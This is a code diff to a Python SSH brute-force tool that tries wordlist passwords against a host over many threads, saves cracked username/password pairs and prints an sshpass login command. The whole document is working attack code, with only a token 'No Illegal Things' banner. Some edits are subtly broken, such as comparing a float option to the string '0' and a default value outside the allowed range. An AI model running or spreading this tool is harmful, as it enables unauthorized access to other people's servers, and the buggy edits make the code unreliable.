@@ -14,6 +14,13 @@ import threading, time, os, sys
 
 import colorama
 
+class Range(object):
+    def __init__(self, start, end):
+        self.start = start
+        self.end = end
+    def __eq__(self, other):
+        return self.start <= other <= self.end
+
 stop_flag = 0
 
 attempts = 0
@@ -83,10 +90,10 @@ parser.add_argument('-w', '--wordlist', help='Take A Good Wordlist Like Rockyou.
 group.add_argument('-v', '--verbose', help='Verbose For More Detail About Your Brute Force', action='store_true')
 parser.add_argument('-p', '--port', help='To Connect With Different Port', default=22, metavar='')
 parser.add_argument('-o', '--output', help='To Save Your Result In Your File', default='output.txt', metavar='')
-parser.add_argument('-T', '--threads', help='To Make Your Brute Force Faster Choose [0, 1, 2, 3, 4] One Degit!',
-			type=int,
+parser.add_argument('-T', '--threads', help='To Make Your Brute Force Faster Choose range(0, 4.0) And Make Sure To Be Float !',
+			type=float,
 			default=5,
-			choices=[0,1,2,3,4,5],
+			choices=[Range(0,4.0)],
 			metavar='')
 parser.add_argument('-e', '--unicode', help='To encode Your Wordlist With Your Unicodes', default='utf-8', metavar='')
 parser.add_argument('-q', '--quiet', help='To Avoid The Noises', action='store_true')
@@ -124,7 +131,7 @@ class errors:
 		os._exit(os.EX_OK)
 
 	def connection_error():
-		print(f"[{C}] Connection Error.....")
+		   	print(f"\n[{C}] Connection Error...")                                                                                                                                     
 
 def verboser(func):
 
@@ -145,7 +152,7 @@ def verboser(func):
 				for password in wordlist.readlines():
 					now = datetime.now()
 
-					current_date = now.strftime("%d,%B,%Y, %H,%M,%S")
+					current_date = now.strftime("%d-%B-%Y, %H-%M-%S")
 
 					if stop_flag == 1:
 
@@ -155,10 +162,16 @@ def verboser(func):
 					password = password.strip()
 					print("[{}]-[{}] Attempting Time To Connect --> '{} : {}'".format(current_date, attempts, username, password))
 					stop_threads = False
-					t = threading.Thread(target=func, args=(host,username,password))
-					t.start()
-					time.sleep(args.threads)
-					attempts += 1
+					if args.threads == 0:
+						t = threading.Thread(target=func, args=(host,username,password))
+						t.start()
+						time.sleep(0.1)
+					else:	
+						t = threading.Thread(target=func, args=(host,username,password))
+						t.start()
+						time.sleep(args.threads)
+						attempts += 1
+			print("Sorry But I Didn't Find AnyThing")
 
 		except FileNotFoundError:
 			errors.file_error()
@@ -177,7 +190,7 @@ def verboser(func):
 
 @verboser
 def verboser_brute(host,username, password):
-
+	global attempts
 	global stop_flag
 
 	ssh = paramiko.SSHClient()
@@ -190,11 +203,13 @@ def verboser_brute(host,username, password):
 		if args.output and args.output != 'output.txt':
 			end_time = time.time()
 			time_took = end_time - start_time
+			time_blink = colored(f"{time_took:.5f}s", 'white', attrs=['fast_blink'])
 			print(f"\n[{V}] Password Found ==>" + Fore.GREEN + f" {password} " + Fore.RESET + ", For This User ==>" \
-				+ Fore.GREEN + f" {username}" + Fore.RESET + f", Have Taken {time_took:.5f}s")
+				+ Fore.GREEN + f" {username}" + Fore.RESET + f", Have Taken {time_blink}")
 			with open(args.output, 'a') as file:
-
-				file.write("username: {}\npassword: {}\n".format(username, password))
+				now = datetime.now()
+				current_date = now.strftime("%d-%B-%Y, %H-%M-%S")
+				file.write("\n[{}]\nusername: {}\npassword: {}\n".format(current_date, username, password))
 				file.close()
 				out_col = colored(f"{os.getcwd()}/{args.output}", 'white', attrs=['bold'])
 				print("="*80)
@@ -206,8 +221,9 @@ def verboser_brute(host,username, password):
 		else:
 			end_time = time.time()
 			time_took = end_time - start_time
+			time_blink = colored(f"{time_took:.5f}s", 'white', attrs=['blink'])
 			print(f"\n[{V}] Password Found ==>" + Fore.GREEN + f" {password} " + Fore.RESET + ", For This User ==>" \
-				+ Fore.GREEN + f" {username}" + Fore.RESET + f", Have Taken {time_took:.5f}s")
+				+ Fore.GREEN + f" {username}" + Fore.RESET + f", Have Taken {time_blink}")
 			cprint(f"\nHELP: To Connect With Password Using ssh Command You Must Install 'passh' Or 'sshpass'\n\
 				 \nTo Install One Of Them: # sudo apt install sshpass\n\
 			# sshpass -p {password} ssh {username}@{host}", 'white')
@@ -220,15 +236,16 @@ def verboser_brute(host,username, password):
 		with open("log.txt", 'a') as logs:
 			logs.write(f"{e}\n")
 			logs.close()
+		print("\nSomeThing Is Wrong, Please Check Again!\n")
 		out_log = colored(f"{os.getcwd()}/log.txt", 'yellow', attrs=['bold'])
 		print(f"Look Inside The Log File {out_log} To Understand The Error!!")
-		return	"\nSomeThing Is Wrong, Please Check Again!\n"
 		ssh.close()
 		os._exit(os.EX_OK)
 
 	except paramiko.ssh_exception.AuthenticationException:
 		print("[{}] Failed To Connect --> '{} : {}'".format(X, username, password))
 		ssh.close()
+		attempts += 1
 
 	except paramiko.ssh_exception.SSHException:
 		pass
@@ -263,10 +280,15 @@ def noverboser(func):
 						os._exit(os.EX_OK)
 					password = password.strip()
 					stop_threads = False
-					t = threading.Thread(target=func, args=(host,username,password))
-					t.start()
-					time.sleep(args.threads)
-					attempts += 1
+					if args.threads == '0':
+						t = threading.Thread(target=func, args=(host,username,password))
+						t.start()
+						time.sleep(0.1)
+					else:	
+						t = threading.Thread(target=func, args=(host,username,password))
+						t.start()
+						time.sleep(args.threads)
+						attempts += 1
 
 		except FileNotFoundError:
 			errors.file_error()
@@ -285,7 +307,7 @@ def noverboser(func):
 
 @noverboser
 def noverboser_brute(host, username, password):
-
+	global attempts
 	global stop_flag
 
 	ssh = paramiko.SSHClient()
@@ -298,8 +320,9 @@ def noverboser_brute(host, username, password):
 		if args.output and args.output != 'output.txt':
 			end_time = time.time()
 			time_took = end_time - start_time
+			time_blink = colored(f"{time_took:.5f}s", 'white', attrs=['blink'])
 			print(f"\n[{V}] Password Found ==>" + Fore.GREEN + f" {password} " + Fore.RESET + ", For This User ==>" \
-				+ Fore.GREEN + f" {username}" + Fore.RESET + f", Have Taken {time_took:.5f}s")
+				+ Fore.GREEN + f" {username}" + Fore.RESET + f", Have Taken {time_blink}")
 			with open(args.output, 'a') as file:
 
 				file.write("username: {}\npassword: {}\n".format(username, password))
@@ -314,8 +337,9 @@ def noverboser_brute(host, username, password):
 		else:
 			end_time = time.time()
 			time_took = end_time - start_time
+			time_blink = colored(f"{time_took:.5f}s", 'white', attrs=['blink'])
 			print(f"\n[{V}] Password Found ==>" + Fore.GREEN + f" {password} " + Fore.RESET + ", For This User ==>" \
-				+ Fore.GREEN + f" {username}" + Fore.RESET + f", Have Taken {time_took:.5f}s")
+				+ Fore.GREEN + f" {username}" + Fore.RESET + f", Have Taken {time_blink}")
 			cprint(f"\nHELP: To Connect With Password Using ssh Command You Must Install 'passh' Or 'sshpass'\n\
 				 \nTo Install One Of Them: # sudo apt install sshpass\n\
 			# sshpass -p {password} ssh {username}@{host}", 'white')
@@ -331,12 +355,13 @@ def noverboser_brute(host, username, password):
 			logs.close()
 		out_log = colored(f"{os.getcwd()}/log.txt", 'yellow', attrs=['bold'])
 		print(f"Look Inside The Log File {out_log} To Understand The Error!!")
-		return	"\nSomeThing Is Wrong, Please Check Again!\n"
+		print("\nSomeThing Is Wrong, Please Check Again!\n")
 		ssh.close()
 		os._exit(os.EX_OK)
 
 	except paramiko.ssh_exception.AuthenticationException:
 		ssh.close()
+		attempts += 1
 
 	except paramiko.ssh_exception.SSHException:
 		ssh.close()
@@ -358,39 +383,63 @@ def logs():
 
 def check_os_ver():
 	if platform.system() == 'Linux':
-		os.system('clear')
-		print("Listen! Good Processer, Good And Fast Result, No Illegal Things! Enjoy ;)")
-		time.sleep(4)
-		os.system('clear')
-		print(word)
-		time.sleep(1)
-		ver_logs()
+		try:
+			os.system('clear')
+			print("Listen! Good Processer, Good And Fast Result, No Illegal Things! Enjoy ;)")
+			time.sleep(4)
+			os.system('clear')
+			print(word)
+			time.sleep(1)
+			ver_logs()
+
+		except KeyboardInterrupt:
+			print("\nI Want To Be Cool And You Killed Me :( , Next Time Use -q To Make Me Sillence.")
+			time.sleep(0.5)
+			os._exit(os.EX_OK)
 	else:
-		os.system('cls')
-		print("Listen! Good Processer, Good And Fast Result, No Illegal Things! Enjoy ;)")
-		time.sleep(4)
-		os.system('cls')
-		print(word)
-		time.sleep(1)
-		ver_logs()
+		try:
+			os.system('cls')
+			print("Listen! Good Processer, Good And Fast Result, No Illegal Things! Enjoy ;)")
+			time.sleep(4)
+			os.system('cls')
+			print(word)
+			time.sleep(1)
+			ver_logs()
+
+		except KeyboardInterrupt:
+			print("\nI Want To Be Cool And You Killed Me :( , Next Time Use -q To Make Me Sillence.")
+			time.sleep(0.5)
+			os._exit(os.EX_OK)
 
 def check_os_nover():
 	if platform.system() == 'Linux':
-		os.system('clear')
-		print("Listen! Good Processer, Good And Fast Result, No Illegal Things! Enjoy ;)")
-		time.sleep(4)
-		os.system('clear')
-		print(word)
-		time.sleep(1)
-		logs()
+		try:
+			os.system('clear')
+			print("Listen! Good Processer, Good And Fast Result, No Illegal Things! Enjoy ;)")
+			time.sleep(4)
+			os.system('clear')
+			print(word)
+			time.sleep(1)
+			logs()
+
+		except KeyboardInterrupt:
+			print("\nI Want To Be Cool And You Killed Me :( , Next Time Use -q To Make Me Sillence.")
+			time.sleep(0.5)
+			os._exit(os.EX_OK)
 	else:
-		os.system('cls')
-		print("Listen! Good Processer, Good And Fast Result, No Illegal Things! Enjoy ;)")
-		time.sleep(4)
-		os.system('cls')
-		print(word)
-		time.sleep(1)
-		logs()
+		try:
+			os.system('cls')
+			print("Listen! Good Processer, Good And Fast Result, No Illegal Things! Enjoy ;)")
+			time.sleep(4)
+			os.system('cls')
+			print(word)
+			time.sleep(1)
+			logs()
+
+		except KeyboardInterrupt:
+			print("\nI Want To Be Cool And You Killed Me :( , Next Time Use -q To Make Me Sillence.")
+			time.sleep(0.5)
+			os._exit(os.EX_OK)
 
 if __name__ == '__main__':
 	if args.quiet and args.verbose:
